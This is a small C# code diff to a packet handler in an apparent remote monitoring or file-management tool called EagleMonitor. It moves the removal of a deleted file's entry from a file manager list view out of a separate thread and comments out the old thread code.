@@ -14,24 +14,29 @@ namespace EagleMonitor.PacketParser
     {
         public DeleteFilePacketHandler(DeleteFilePacket deleteFilePacket, ClientHandler clientHandler) : base() 
         {
-            new Thread(() =>
+            try
+            {
+                if (deleteFilePacket.deleted)
+                {
+                    clientHandler.fileManagerForm.BeginInvoke((MethodInvoker)(() =>
+                    {
+                        try
+                        {
+                            clientHandler.fileManagerForm.fileListView.Items[deleteFilePacket.name].Remove();
+                        }
+                        catch { }
+                    }));
+                }
+            }
+            catch { }
+            /*new Thread(() =>
             {
                 try
                 {
-                    if (deleteFilePacket.deleted)
-                    {
-                        clientHandler.fileManagerForm.BeginInvoke((MethodInvoker)(() =>
-                        {
-                            try
-                            {
-                                clientHandler.fileManagerForm.fileListView.Items[deleteFilePacket.name].Remove();
-                            }
-                            catch { }
-                        }));
-                    }
+    
                 }
                 catch { }
-            }).Start(); 
+            }).Start(); */
         }
     }
 }
